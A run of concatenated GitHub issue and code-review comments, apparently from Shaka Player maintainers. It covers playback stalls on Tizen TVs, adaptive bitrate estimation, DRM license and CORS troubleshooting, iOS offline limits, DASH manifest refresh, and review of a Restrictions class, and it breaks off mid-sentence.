mismatching initialization segment. Therefore, MSE coded frame processing may not interoperably detect discontinuities in appended media.\n00:00:15.816 | warning | Large timestamp gap detected; may cause AV sync to drift. time:17003921791us expected:17002044458us delta:1877333us\n00:00:19.374 | warning | Large timestamp gap detected; may cause AV sync to drift. time:17009041791us expected:17005607125us delta:3434666us\n00:00:23.810 | warning | Large timestamp gap detected; may cause AV sync to drift. time:17014481791us expected:17010044458us delta:4437333us\n00:00:34.309 | seek_target | 17024.733799\n00:00:34.309 | pipeline_state | kSeeking\n00:00:34.309 | audio_buffering_state | BUFFERING_HAVE_NOTHING\n00:00:34.311 | video_buffering_state | BUFFERING_HAVE_NOTHING\n00:00:34.311 | pipeline_state | kPlaying\n00:00:34.395 | audio_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:34.551 | video_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:34.551 | for_suspended_start | false\n00:00:34.551 | pipeline_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:35.060 | info | Effective playback rate changed from 1 to 0\n00:00:35.310 | info | Effective playback rate changed from 0 to 1\n00:00:51.331 | warning | Large timestamp gap detected; may cause AV sync to drift. time:17042961791us expected:17041489790us delta:1472001us\n00:00:56.794 | audio_buffering_state | BUFFERING_HAVE_NOTHING\n00:00:56.795 | for_suspended_start | false\n00:00:56.795 | pipeline_buffering_state | BUFFERING_HAVE_NOTHING\n00:00:57.847 | seek_target | 17046.728025\n00:00:57.848 | pipeline_state | kSeeking\n00:00:57.849 | seek_target | 17046.714799\n00:00:57.850 | video_buffering_state | BUFFERING_HAVE_NOTHING\n00:00:57.850 | pipeline_state | kPlaying\n00:00:57.850 | pipeline_state | kSeeking\n00:00:57.851 | pipeline_state | kPlaying\nFrom Chrome's internal logging, it appears that something is wrong with the media which causes these stalls.  These are different from a buffering event, because we are inside a buffered region at the time.  The playback pipeline stalls, possibly related to the \"Large timestamp gap detected\" warning message.\nI would consult with the encoder vendor and see if you can resolve this with them.  There is nothing obviously wrong with Shaka Player.  We are doing our best to recover from a bad situation that we can't directly control (small seek range, stalled browser).. I will go ahead and mark this as a bug since we intend to work around it.  In truth, it seems to be Samsung's bug.. Our Tizen TV is inaccessible right now, and may remain so for a couple days.  We have a speculative fix, but haven't been able to verify it yet.  I will also go ahead and submit the change, though.  @avelad, can you please test and confirm the fix for us when you have time?. No worries.  I may be able to test it myself before then.. Fix released in v2.4.7.  Let us know if you have any further issues!. I will update the issue template to ask for model number and firmware versions on embedded devices.. @TheModMaker, I disagree that our ABR logic won't work with multiple players.  I believe that estimating based on throughput with players constantly working will produce a reasonable estimate for what each can achieve.\n@trustfarm-dev, I agree with @TheModMaker about the expense of seeking.  Instead of seeking, I suggest adjusting video.playbackRate gently to get some tiles to catch up or slow down to sync with each other.  For example, if one tile is behind the others, try setting playbackRate to 1.02.  Or if one tile is too far ahead, it could have playbackRate of 0.99 to let the others catch up.  I have seen some clever multi-device sync solutions that worked this way, though I don't know what algorithms they use or what their min/max playback rates are.  The app would have to carefully coordinate them all.\nIt's also worth noting that players could get out of sync without a buffering event at all.  Rendering of media in the browser or any other player is not so precise as you might expect.  So long as it is accurate enough relative to human perception, it doesn't need to be perfect.  For each individual player, this means sync between audio and video need to be close enough to look right to humans.  But so long as that were true for each player, the browser would be under no obligation to keep multiple players in perfect sync with each other, even if their media were all 100% pre-buffered.. @hosung03, @trustfarm-dev, I don't understand some of your comments.\nWhat do you mean when you say \"how not to display the red line\"?  What red line is this?  Shaka Player does not render the video.  If there's a red line in the video, that's either something in the video content itself or some artifact of browser decoding.\nWhat do you mean when you say \"a lite call of currentTime\"?  I don't know what this means.  video.currentTime is the API for seeking provided by the browser.  It's part of HTML5 video.\n@trustfarm-dev, I don't think gap jumping has anything to do with this.  At least, I see no evidence of it.. I'm not certain that concurrent downloads should be modeled explicitly, or that bandwidth estimates should necessarily be shared across Players.  I'll elaborate with an example, starting with some assumptions, and then exploring what happens when some of those assumptions are broken.\nFor example, let's imagine 4 independent players playing at once.  Let's make some simplifying assumptions:\n  1. they don't coordinate\n  2. they don't share a bandwidth estimator or networking engine\n  3. they all are playing content with high enough bitrates to saturate the network uplink\n\nIf everyone is playing at the limit of what is possible, then they can't buffer far ahead.  If the buffering goal is never fully met, then they are each always requesting something as soon as a request & append cycle completes.  There are therefore almost always 4 video segment requests at any one time.  (Ignore audio, since it is very small compared to video, especially when the video quality level is high.)\nIn this scenario, each would build an estimate of about 25% of the actual usable bandwidth.  This seems to be the obvious fair limit to what each can achieve concurrently.  Then what is there to gain in this scenario by sharing an estimator or sharing a networking engine?\n\nNow, let's assume that the content is not actually capable of saturating the network uplink.  In this scenario, we may achieve our buffering goal, and therefore a given player may go idle.  Here, the available bandwidth will be less consistent.  When concurrent requests are happening, available bandwidth goes down, and so does the estimate.  Future requests will be at a lower quality level to compensate and maintain the buffer.\nWhat do we stand to gain here by sharing an estimator?  If the estimate accounts for overlap and sums the overlapping parts, it would report something closer to the actual network bandwidth.  But if we report the full bandwidth of the network while multiple players are streaming, today's AbrManager would end up choosing streams that it couldn't sustain without buffering.  So this would require AbrManager to be aware of multiple players, as well.\nThat might be useful, but what if the players are in separate tabs?  Separate domains?  Sharing becomes impossible in those situations.\nWhat if there's only one video player, but somebody else in the next room doing some other bandwidth-intensive task on the same network?  We have to be able to handle this just as well, which I would argue that we do in the current throughput-based model.\n\nWhat we wind up with in the general case is that these are all equivalent in terms of how we should behave:\n\nmultiple concurrent players in the same tab\nmultiple concurrent players in different tabs\nmultiple concurrent players, some of which are not Shaka Player\none player competing for bandwidth with a game, file sharing, etc\n\nIn the general case, these concurrent demands on bandwidth will result in more variability in the bandwidth estimate, since concurrency may not be consistent.\nIf we coordinate between player instances, we could end up with a system of staggering requests to avoid overlap and achieve more throughput overall.  However, in 3/4 of the scenarios just above, we can't do that.\nInstead, I would suggest that we could get more benefit from a system which models the variability in our estimate over time.  If we have an inconsistent estimate because of variable concurrency in requests (from any cause), we may want to adapt to become more conservative and decay our lower-bound estimate more slowly.  This would also improve another scenario where actual bandwidth varies without concurrency: a user in transit on a mobile network.\n\nThoughts?. It's true that it's a way for us to pick a variant.  Picking variants is (by default) an optimization problem.  We try to play the highest quality variant that we can stably play without rebuffering.  A model of actual throughput is how we chose to do that in the very earliest days of Shaka Player.\nThe biggest advantages of our throughput-based model are that it is simple and it natually accounts for the ineffeciencies of how Shaka Player actually operates.  For example, StreamingEngine doesn't request another segment until the it finishes the first one.  You could achieve higher bandwidth utilization by overlapping requests, so that the TCP slow start phase (article, graph) of one segment overlaps the end of the previous segment.  This could result in higher quality variants, at the cost of more complexity in the code and less wiggle room in our estimate.  Since we don't actually do that, we may only be using (hypothetically) a large percentage of the real network bandwidth.\nSo if we found that our estimate were only 90% of actual max network bandwidth, it would mean we are only capable of utilizing the network at 90% of its capacity.  The important thing, though, is that our estimate is an accurate reflection of what the code can stream without rebuffering.  If we selected variants based on a magical oracle that gave us actual max bandwidth, we could wind up rebuffering.  That number would not account for our own inefficiency, and therefore would probably not be achievable by us.. Should be easy to fix.. Fix cherry-picked for v2.4.6.. The error is not an npm package error.  It appears to be an error from the compiler about a missing compile-time dependency within our sources.  I'm attempting to reproduce now.. I can reproduce on Windows, but the same doesn't occur on Mac or Linux.. This seems to be a bug in our build scripts regarding how path names are handled.  It should be fairly easy to fix.. Fix cherry-picked for v2.4.6.. Fix cherry-picked for v2.4.6.. Firefox on Android does not support Widevine.  This is outside the control of Shaka Player, Android, and Widevine.  Please file a bug with Mozilla to request support: https://bugzilla.mozilla.org/\nOffline content works on Android with Chrome, which supports both Widevine and persistent licenses.\nThanks!. This is a bug in how our stream is managed on the machine that does the encoding.  It occured after a power outage, and there is not yet sufficient automation to fix it automatically when the service starts back up.  I'll mark it as \"external\" and work on a fix.. Yes, I agree.  We already have an open issue internally on our test infrastructure to do this.. The stream is fixed now, including necessary automation in case it restarts.. I'm sorry, but I don't understand your request.  Please make sure you are in the right place (Shaka Player support) and use the issue template next time.  Thanks!. @gurusoftgit, you did not fill out the issue template which provides us with the necessary information to provide you with support.  But I notice that you reference cast.framework.media.ShakaPlayer.  That sounds like you are using the Cast Application Framework.  CAF uses Shaka Player, but is not developed or maintained by this team.  Please refer to that project's Cast Support Page for details on how to get help with CAF.. @TheJohnBowers, is it intentional that requests for persistent licenses are denied by the VDMS license server?\nSince license servers generally are allowed to deny requests for persistent licenses, I think we may need to flag which of our encrypted demo assets permit storage offline.  The ones we (Shaka) control all permit storage, but we can't control the policy settings of third parties.. I don't think we care if these particular assets can get a persistent license or not, so feel free to change it or not as you see fit, @TheJohnBowers.  But I think this highlights the need to flag certain third-party assets as not storable, so that the demo app doesn't offer a capability it can't provide.. Offline storage restriction in demo app cherry-picked for v2.4.6.. I would suggest a different name: player.retryLicensing().  Retrying a \"request\" is very generic, and the name could apply to all kinds of network requests.  Since we want something that parallels player.retryStreaming(), but for DRM licenses, I think retryLicensing() is the better name.\nI'll rename the issue to reflect that.. I would like to add that isBrowserSupported() without polyfills is still accurate in general (ignoring Safari 8, which is no longer widely used).  If you leave out polyfills, for example, isBrowserSupported() may return false on a platform where it would otherwise return true.  This would be an accurate statement on the part of the library if we can't support that platform without polfyills.. @oldmtn, can you please point me to the doc you're referring to?. Actually, I think I found it: https://developers.google.com/cast/docs/chrome_sender/integrate\nIt says:\n\nAdd the loadCastFramework URL query parameter to load the Cast Sender Framework API as well.\n\nThe docs then mention that both a high-level Framework API and a low-level Base API exist.  At the time we created our Cast support, only the Base API existed.  That is what we use to implement the classes in the shaka.cast namespace.\nOn the receiver side, the Cast Application Framework actually depends on Shaka Player.  But CAF uses a completely different messaging protocol between sender and receiver, and uses Shaka as a tool to do DASH playback.  It doesn't expose the full Shaka Player API.. Does this answer your question?. We don't add that.  The Chrome Cast extension adds that.  You will see that line in the debugger, but not in the source.  That's because it's added by the browser extension at runtime.\nDoes this answer your question?. @kevinscroggins-youi, how is it that you have this issue on Chrome?  Chrome only supports Widevine, so there is no opportunity to force a particular DRM as far as I know.\nFor Tizen, you have two ways to force the choice of Widevine or Playready.  There is no built-in priority order in Shaka Player.  If you configure a license server for one, but not the other, we will use the one you configured.  If you configure both, we will try them in the order they appear in the manifest.\nDoes this help?. There is no green background added by Shaka Player.  The green you're seeing would be an artifact of the decoder.  Since this doesn't show up with all content, I expect it's an incompatibility of some kind between the encoder and the decoder.\nI would recommend you first check for updates to your encoding software.  Next, I would suggest you file bugs on both your encoding vendor and Apple Safari.\nUnfortunately, this is an issue we have no influence over at the JavaScript level.  Sorry we can't do more to help!. In my opinion, if there's not a clear error code for this, we should add one.  addTextTrack returns a Promise, so that Promise could be rejected with a shaka.util.Error object with an unambiguous error code.\nI suggest adding error code UNKNOWN_TEXT_MIME_TYPE, value 2010, with data[0] being the MIME type in question.  This would use existing error category TEXT, value 2, and the severity would be RECOVERABLE, since playback could still continue.. Is an HTTP server allowed to return the wrong amount of data?  I expect that the only valid HTTP response with less data than requested is if the file actually ends.  If that's the case, then the server isn't wrong and a retry wouldn't help.\nIf there's evidence in the HTTP spec to say that it's the client's responsibility to handle less than the requested data in cases other than end-of-file, we could try to implement what you're suggesting.  Otherwise, it seems that something is wrong on your server.. It's hard to say that protecting the player from server bugs is worth the effort.  If you have a particular buggy server or some other situation that is occurring in real life, it could help motivate the change.  But I don't think it makes sense to take on additional technical complexity for a hypothetical situation.  Does that make sense?. It was not, but I just pushed it to v2.4.x in cd9d066386180028c8e0078ea7171163fae34775, which will be released in v2.4.7.  Sorry for the inconvenience!  I didn't realize we had missed that fix.. Hi, @mseeley.  I'm working on it today.  We're a bit behind on everything, which is hard to tell since I haven't published a timeline or roadmap yet.  That's coming soon, too, though.. Just noticed that this is still in \"needs triage\".  I'm going to go ahead and close as a duplicate of #1602 based on the history so far.  The fix for that is in master (so you can try it out any time) and will be rolled into v2.4.7 very soon.  Thanks!. Fix released in v2.4.7.. > Ideally, it would be nice if we could somehow preload stream data via a Shaka API call and then apply that buffer when we choose to play that video content.\nThat sounds exactly like our plan for preload, which is tracked in #880.  We will not be able to work on it until after some big refactors in v2.6, though, which we think will take us all of Q2 2019.  So you can expect preload some time in Q3.  I've just updated #880 with a similar note on the timeline.\nThere aren't many good options to get the same effect with today's Shaka Player.  Here is what I can think of off the top of my head:\n\n\nSince Shaka currently requires a video element to begin loading content, you can create a second, hidden video element and associated Player instance (video2/player2 below).  You can call load() on the player2 while player1 is playing out the end of the current content.  When the current content ends (ended event from video1), you can hide video1 and show video2, call video2.play() and player1.unload().  This is probably your best bet, and it should work on desktop and mobile, but it probably won't work on every device (smart TVs, game consoles, other platforms which may only support one video element at a time).  If you're okay with this restriction, it's probably the most robust solution with today's Shaka Player.\n\n\nFor a single instance of Player, if content were cached in advance through any mechanism, you could reduce the load latency.  However, it is very tricky to guess or force what bitrate you'll be loading when you do call load(), so caching segments in advance may be infeasible.  Providing segments from cache also has the potential to skew bandwidth estimates, so we really don't recommend going this route in any case.  If you must go this route for some reason, we have guidance on how to make sure the Player knows which responses are coming from a ServiceWorker cache: https://shaka-player-demo.appspot.com/docs/api/tutorial-service-worker.html\n\n\nYou could do the same as in option 2 above, but by providing pre-cached responses through our networking plugins instead of a ServiceWorker cache.  The same issue with guessing or forcing bitrates applies, though.  I wouldn't recommend this, either.. Does this answer your question?. This is working as intended.  The library only exports certain APIs.  The ones you mentioned are not exported from a production build.  For example, shaka.log is compiled out in production, and shaka.media.DrmEngine is an internal class that applications are not meant to interact with directly.\n\n\nTo access the internals, you can use a debug build or an uncompiled build, but we make no guarantees about backward compatibility of those interfaces.  They may change at any time, in any release.\nIf you have a specific need for those internal methods in your application, I may be able to help you find a supported way to accomplish the same thing.\nDoes this help?. Thank you!. With #997, we will be able to pass HLS content through to Apple's native HLS implementation for you, but we will not be in charge of playback in that scenario.  It is a convenience feature only, so that applications don't have to write special cases for iOS.  This will not result in offline playback, though, because of the lack of MediaSource support from Apple.. Yes, modernizr would not add the missing MediaSource feature to an iOS browser.. Fixed by #1810.. iOS support for Shaka Player will be dependent on Apple's built-in HLS implementation.  This is because iOS does not support MediaSource.  Not only is MediaSource necessary for our JavaScript-based HLS implementation, but it is necessary for our offline playback support (both clear & encrypted).\nSo offline support on iOS will not be possible until Apple enables MediaSource on iOS.  Please file an issue with Apple to let them know that this matters to you: https://developer.apple.com/bug-reporting/\nI have it on good authority that Apple will take this feedback into consideration.  When your issue is filed, please post a link or ID number here so that we can refer to it in future conversations with Apple on this topic.  Thanks!. @stuartflanagan, yes, please file a bug with information we can use to reproduce the issue.  Please make sure to mention in the report whether this is live or VOD content.  Thanks!. I believe the fix @johnsim referred to was to fix Windows / PlayReady, not the player.. Is the Widevine license server on another domain?  If so, it's a cross-origin request, and the server must explicitly allow the headers you're adding.  You can find detailed docs on Cross-Origin Resource Sharing (CORS) on MDN: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\nIn short, the addition of request headers triggers an OPTIONS request (not GET or POST), and the server's response dictates what headers should be allowed.  If your headers aren't on the list provided by the server (or no list was provided), then the license request will be blocked by the browser.\nLook more closely at the \"empty\" requests in the network tab.  Is this what's happening?. Do you have any request filters that alter request.body?  A bug in a request filter could cause this.\nYou can also debug in DrmEngine, in sendLicenseRequest_.\nhttps://github.com/google/shaka-player/blob/d2069dcd7642e788164d52a56bc6103df86a396b/lib/media/drm_engine.js#L1176-L1181\nIf the request body is non-empty at that point, but empty later, we can further narrow down the cause.  If it is empty at that point, though, we can point the blame to the Widevine CDM instead of the JavaScript code.. Yes, that's correct.  The 2-byte POST is a valid request from the Widevine CDM.  It should be followed by another request from the CDM with a longer payload.\nCan you confirm that the license server is responding to this request?  And that the CDM accepts the response without generating an error through Shaka Player?. You are correct!  Thank you for pointing this out.\nI compared the results on appspot with a local build.  The effect is seen locally, so it's not an issue with our deployment process.. Our build script had a regression in 6b1ca2d229b855e4064d7d13dc0918bd020eab43, which was a complicated merge from a private branch.  It should be easy to fix.. df3926916e791a95863b86fb423de35724e439ae doesn't fix anything, it just adds a comment and reformats the code.  I think two of us fixed the bug separately, and then the two fixes were merged.  The commit that landed first and actually fixed the bug was d420b460770944711dd4d74f9f63e55fb4a963bb.\nHowever, that had to do with shaka.ui.TextDisplayer, and this issue is about shaka.text.SimpleTextDisplayer, so we should take the time to test without the UI library and see if we can reproduce.  Our demo app uses the UI library, so it's possible that something slipped by unnoticed in the other build config.. Using the exact tag v2.5.0-beta3, I can't reproduce your results with the sample application in our \"basic usage\" tutorial.  I see no exception, and I can display subtitles by running:\njs\nplayer.selectTextTrack(player.getTextTracks()[0]);\nplayer.setTextTrackVisibility(true);\nSo the text displayer is working properly.\nTwo things worth noting, though:\n\nThe sample app waits for document's DOMContentLoaded event before constructing a Player instance.  In general, you should probably be waiting for some event to know that your JS is fully loaded and that the necessary DOM elements are available.  If you aren't doing that, this could be the key difference between your app and mine.\nAlthough Player references SimpleTextDisplayer, it doesn't goog.require it.  This would cause issues with the dependency ordering in the compiler, which would explain how beta2 and beta3 differ.  This is a bug on us, but one you should be naturally working around by waiting for some appropriate event as described above.\n\nThe missing goog.require is a pretty trivial fix, so I'll get that done right now.. > * Could the check for WebOS be in the callback passed into |onStall|? That way the core code of StallDetector won't have platform-specific code.\nGiven that we have platform checks isolated in shaka.util.Platform now, I don't see a strong need to isolate StallDetector from that.  If we want to audit platform-specific logic in the future, it's easy to find these checks by looking for call sites of Platform.  If we had more complex logic for when to use StallDetector and when not to use it, I could see doing it differently.\n\n\nLong term, @joeyparrish would it make sense to have StallDetector be an optional component that would only be initialized if we are on a platform that should react to stalls?\n\n\nYes, long term, I think greater modularity could be nice.  Stall detection could even be disabled via configuration at that point.  For now, though, it's not needed.  We can file that as an issue to come back to at a later time.\n\n\nCould we have some more documentation around why we are not reacting to stalls on WebOs?\n\n\nYes, please.  @avelad, if you could add a brief comment to the code, that would help.  I left a suggestion on the code itself.\nLooks good to me otherwise!  Thanks!. @skipness, since your log shows the \"stall inside buffered range\" over and over, you could try making a change to this code to skip stall detection on Tizen:\nhttps://github.com/google/shaka-player/blob/1095ecb009b363b8889998015793f0526ca6e01e/lib/media/stall_detector.js#L144-L148\nIf that doesn't help, we'll definitely need a way to reproduce the issue.  Thanks!. @skipness, thank you for reporting back on that.  We will try to reproduce with the information sent to us by  @selesh3.. The only way we can debug the issue is if you provide us with instructions to reproduce the issue.  If you don't share a manifest URL or find a public manifest that reproduces the problem, there is absolutely nothing we can do to debug it.  It is extremely rare that the manifest text alone is enough to understand or fix a bug, especially a platform-specific or DRM-specific bug.\nIf you send a manifest URL and license server URLs to the email alias provided above, it will be kept confidential and will not be shared outside our team of developers at Google.  It will not be shared with any other part of Google or with any contributors outside Google.\nIf you absolutely can't share the content, you have a few options:\n\nTry to change the minds of the people who make that decision\nGet your infrastructure people to run a live stream using some public content, like Sintel, Big Buck Bunny, etc. and share that with us\nDebug the issue yourself, asking us for tips when you get stuck\n\nPlease let us know what works best for you, and we'll do our best to accommodate you.  Thanks!. Sounds good.  Thanks!. It's also worth noting that an aggressive buffering goal won't work on all devices.  If we try to buffer more than the browser has memory to store, we will get a \"quota exceeded\" error, which we handle by reducing our buffering goal.\nWhat's critical is that we reduce it multiplicatively.  So if we reduce to 90% of infinity... That's still infinity.  And so on, until we give up and fail playback.\nSo please don't use a buffering goal of infinity.  :-)\nInstead, I recommend a goal of video.duration (after loading the clip, so that value has meaning) or some fixed value on the scale of the video duration (like 10 minutes, or 2 hours, or whatever).. I believe we are driving the tracks API from the metadata in the HLS playlist.  Can your playlist be fixed to signal the presence of the CC data?. Then I'll convert this into an \"enhancement\" issue to build CC metadata on-the-fly as captions are discovered in the content.  Note that this would only work for TS content, and only with mux.js installed for transmuxing.  In other cases, we would not have the opportunity to discover the captions.  In MP4 content, we would not be parsing the content unless the metadata was there to signal the presence of embedded captions.. The CAF team have their own release schedule, which I can't predict.  But it would have to be in a Shaka Player release first, and this is not scheduled for a release yet.. CPIX is not part of DASH clients.  It is for encoders and packagers and DRM license servers to exchange keys at content preparation time.\nSection 3 of the CPIX doc states (emphasis added by me):\n\nThere is no assumption on the entities exchanging this information but it is not expected that a client device will use this exchange format. The goal is to allow entities involved in the content preparation workflow to get the content protection information so that, for example a DASH MPD can be generated with all content protection information.\n\nDoes this answer your question?. Thanks for the note.  We appreciate it.\nFor now, we have two other devices in queue to integrate with our lab testing environment (XBox One (#1705) and LG WebOS (#1330)), so we can't look into Amazon Echo Show right now.\nBut we'll keep it in mind.  I'm always interested in adding new platforms to the family.\nIn the mean time, let us know if you need help debugging or if you have any PRs to improve support for the device.  Thanks!. It could be that some API used by the Cast SDK requires a secure origin.  This is the case for EME, but I'm not familiar with the underlying APIs used by Cast.. Yes, that's right.  Our cast support is dependent on the Cast SDK, which is dependent on that API and its restrictions in Chrome.. I'm not sure.  This is all still very new, and we (Shaka Player) have yet to run any tests to understand the new behavior.  As it was explained to me, though, the rejection will happen at the license server.  An older Chrome version with a matching CDM will still be consistent on the client side, but license servers will (by default) reject requests from those clients.  I believe there will be a way for Widevine servers/proxies to override this behavior and permit older clients, but I don't know what it is yet.. @chrisfillmore, that all sounds right to me.. @grantg182, does this answer your question?. If your MPD may need to be refreshed, you should always mark it as dynamic.  This will ensure that the client will refresh when required.  A VOD clip can still be dynamic without any issues.\nYou can use minimumUpdatePeriod to ask us to refresh periodically, or you can omit this property, signal an <InbandEventStream> with the appropriate schema, and embed an emsg box in the content to trigger a manifest refresh only when necessary.\nDoes this answer your question?. > Once I stop the encoding process with FFmpeg, the MPD changes from dynamic to static. I'll start the encoding process again. The MPD is dynamic now. Shaka is not identifying this state\nThat's because static manifests don't get refreshed, according to the spec.  They are static: they don't change.  So if you expect them to change, you need to make sure they don't get labeled as \"static\".  If you can't get this from ffmpeg, you can either put another layer in between ffmpeg and delivery to the client, or you can ask for support from ffmpeg to control this behavior, or you can patch ffmpeg to do what you want.\nBut fundamentally, if the manifest says \"static\", we don't refresh it, because you've told us not to by putting \"static\" in it.  This is working as intended.. @saibalaji10, what you are doing is non-standard.  We can't continue to offer support for this.  If you can modify Shaka Player to get the effect you want from this non-standard arrangement, then please do.  It's open source, and you make any changes you like in your fork.  But our support resources are limited, and we have to draw the line somewhere.  We've chosen the DASH InterOp Points (IOP) to define what we can and can't invest time in.\nInstead, let us try to recommend a standards-based solution that we could support.\nIt seems that ffmpeg's manifest output is not able to express what you are trying to do.  This makes sense, because ffmpeg has no state to span the change in segment size.  You're starting ffmpeg again, and it believes (correctly) that the stream has started over.\nOne option could be to modify ffmpeg in some way to get output consistent with your unique use case.  For example, you could make ffmpeg always output type=dynamic.  Or you could modify ffmpeg to allow you to change the segment size on-the-fly.  Or you could build your own application with libavcodec, libavformat, etc instead of using the ffmpeg command line front-end.\nAnother option would be to have ffmpeg output segments and use a separate DASH packager to output the manifest.  What you are doing maps very well onto multi-period DASH.  Each time you change the segment size, ffmpeg starts over at zero, and your packager creates a new period that stitches onto the end of the previous one.  Each period has an internal timeline independent of the others, so ffmpeg is free to start over without any state from before.\nI strongly recommend that you investigate multi-period DASH for this.  I think it will save you a lot of trouble in the end, it's standards-based, and or doesn't involve modifying ffmpeg or Shaka Player . @Anirudh58, I assume you found a solution.  Can you share what you found, in case others have a similar issue and come across this later?. Is this a conversation you would feel comfortable having publicly on GitHub?. You can find my email address in the CONTRIBUTORS file.. To get consistency across browsers, Shaka Player does not detect when the browser goes into a buffering state.  Instead, it manages buffering state explicitly at the player level.  When the buffer runs low, it interrupts playback.\nTo do this, we had two basic options: .pause(), or .playbackRate = 0.  We found that setting playbackRate to 0 was less disruptive because it allowed applications & users to manage play/pause state independent of buffering state.\nIn discussions with colleagues at Chrome & YouTube, though, it has recently come to my attention that we should re-evaluate this strategy.  By preventing the browser from completely underflowing, we inhibit the browser's ability to instrument buffering on its own.\nSo this behavior may change in the future.  More research is needed.\nDoes this answer your question?. The media playlists have #EXT-X-KEY:METHOD=AES-128,URI=\"800k.key\", so we should be able to recognize and reject that as unsupported.  #850 is already filed to track adding AES-128 support.  So we'll make this issue about correctly recognizing and rejecting the content until #850 is implemented.\n@macoybarayan, I'm sorry for the confusion.  We'll correct the parsing and surface a more meaningful error code until we do support it.. The media playlists have #EXT-X-KEY:METHOD=AES-128,URI=\"800k.key\", so we should be able to recognize and reject that as unsupported.  #850 is already filed to track adding AES-128 support.  So we'll make this issue about correctly recognizing and rejecting the content until #850 is implemented.\n@macoybarayan, I'm sorry for the confusion.  We'll correct the parsing and surface a more meaningful error code until we do support it.. We have not yet published a roadmap, but I am working on that.  We expect to release v2.5.0 around the end of March.. We have not yet published a roadmap, but I am working on that.  We expect to release v2.5.0 around the end of March.. It doesn't seem to have anything to do with deprecating the function, as far as I can tell.  It seems to be related to the native implementation of Blob URLs.\nI'm not certain if we could attach the MediaSource object to the video element directly across browsers.  It depends on how widely-implemented that newer method is.\nMaybe we could do as you suggest and capture the native implementation at load-time.  That would work around the issue, so long as you control the order of execution for the two scripts.\nIt would also change the mocking of URL in the related unit tests, which could then mock MediaSourceEngine instead of URL:\nhttps://github.com/google/shaka-player/blob/0f0a3515b6423e1909c8f658407047b660b7ccbf/test/media/media_source_engine_unit.js#L164\nWould you be interested to contribute a PR for this?. It doesn't seem to have anything to do with deprecating the function, as far as I can tell.  It seems to be related to the native implementation of Blob URLs.\nI'm not certain if we could attach the MediaSource object to the video element directly across browsers.  It depends on how widely-implemented that newer method is.\nMaybe we could do as you suggest and capture the native implementation at load-time.  That would work around the issue, so long as you control the order of execution for the two scripts.\nIt would also change the mocking of URL in the related unit tests, which could then mock MediaSourceEngine instead of URL:\nhttps://github.com/google/shaka-player/blob/0f0a3515b6423e1909c8f658407047b660b7ccbf/test/media/media_source_engine_unit.js#L164\nWould you be interested to contribute a PR for this?. Thank you!. Thank you!. @kevinscroggins-youi, thank you!  I ran it through our build bot and it failed some linter checks.  Can you please take a look and fix those?. Awesome, thanks @vaage!. Awesome, thanks @vaage!. I believe I can merge these three Dolby commits in one PR.  I'm going to update the PR subject line, though, since this goes beyond fixing the link.. I believe I can merge these three Dolby commits in one PR.  I'm going to update the PR subject line, though, since this goes beyond fixing the link.. @bartt, could you fix the linter errors turned up by the build bot?  You can also run the linter, compiler, and tests yourself with python2 build/all.py and python2 build/test.py.  Thanks!. @bartt, could you fix the linter errors turned up by the build bot?  You can also run the linter, compiler, and tests yourself with python2 build/all.py and python2 build/test.py.  Thanks!. Thank you for your contribution!. Ah, yeah, those scripts currently require python2.  If you have that, you can run python2 build/test.py.\nBut I'll run it through the build bot again.. For variables you reassign, use let instead of const.  For the private access issue, you can make the member public (remove the @private annotation and the trailing underscore) and make it clear in the comments that it is for use by tests only.. Thanks!  I've requested another test run through our build bot.. Thank you for your contribution!. The browser's native controls are not able to correctly display the seek bar for live content.  For this, you will need custom controls (the only option in v2.4.x) or the Shaka Player UI library (in master branch & v2.5.0-beta3, also soon to be in v2.5.0's final release).  Here's a tutorial on the UI to get you started: https://nightly-dot-shaka-player-demo.appspot.com/docs/api/tutorial-ui.html\nDoes this help?. I like that this is a clone of the Restrictions object, but instead of returning a generic Object, let's return an instance of Restrictions instead.  To this end, please add a clone() method to Restrictions.prototype.\n. Instead of iterating through the keys and updating the internal Restrictions object, let's take an instance of Restrictions from the caller and just replace ours with that.  You'll have pass the new Restrictions to the EmeManager as well.\nThen you can replace the 'struct' annotation in Restrictions.  (A struct, in Closure, means that arbitrary properties cannot be added to an instance.  It helps catch typos like \"restrictions.mxBandwidth = 5\", which would otherwise cause no error since you could well intend to add a new property to this instance.)\n. Not by the manifest.  There aren't any restrictions in the manifest.\nThe license response may have restrictions in the form of a app-level header, but even that is an application-specific convention arranged between the client app and its own license server.  So either way, it's application-specific or service-provider-specific logic that sets restrictions, and up to the application to set them intelligently.  The library simply gives the application a chance to set restrictions based on the license response, since this is a pre-existing paradigm that we would like to enable.\n. Let's make convert \"parent\" to \"player\" (type shaka.player.Player).  We're already passing the player as the parent, but let's have EME manager store this.player_ instead of this.restrictions_.\nThen, instead of postProcessor(this.restrictions_), this.videoSource_.setRestrictions(this.restrictions_), we can say restrictions = this.player_.getRestrictions(), postProcessor(restrictions), this.player_.setRestrictions(restrictions).\nThat will make the postProcessor flow and the independent, application-level flow the same.\n. Should be this.player_.setRestrictions now.\n. Asserting on the type of something that is already enforced by the compiler is not really necessary.  I suggest removing it.  Same for the runtime check below, which is not only not necessary, but if triggered, would cause the call to be silently ignored.  I think silently ignoring a call like that is likely to cause debugging headaches later.\n. Please put 'struct' back on Restrictions.  I really think it's important to have the compiler check that the correct member names are being used.\nTo make this work, I see two choices:\n1. Have clone() say \"restrictions.x = this.x\" explicitly for all 4 properties.  It's duplication, but at least it's maintained right next to the constructor, so updates should be easy to keep in sync.\n2. Have the constructor take an optional Restrictions instance as an argument, such that the member declaration is of the form: \"this.x = restrictions ? restrictions.x : null;\".  Then there's only one place to maintain the property list, and r.clone() becomes an alias for \"new Restrictions(r)\".\n. Fair enough.  Then instead of returning silently, let's throw an exception instead.\n. TypeError seems appropriate.\n. I think since the exception is more serious than the assert, and the assert is removed in compiled mode, just the exception should be enough.\n. Nice catch!  This bug appears to exist upstream, as well.  Can you report and/or patch there, too?  https://github.com/google/closure-library/blob/master/closure/goog/uri/uri.js#L335\n. Please add a copyright header to this file.\n. Did the linter not complain about private variables that don't follow the naming convention (trailing underscore)?\n. Missing @type?\n. What is the purpose of these defaults of 200 and 100?  It seems they are not used at the moment, only replaced on init().\n. Seems like this is not the best way to clear the canvas.  From what I can tell, clearRect() is both faster and more portable than resetting width.\n. Why -5?\n. Initialize to 0?  It seems that if you use this without initializing it, you'll get an X coord of NaN.\n. style nit: please remove blank lines at the beginning and end of functions.\n. style nit: move else if to the previous 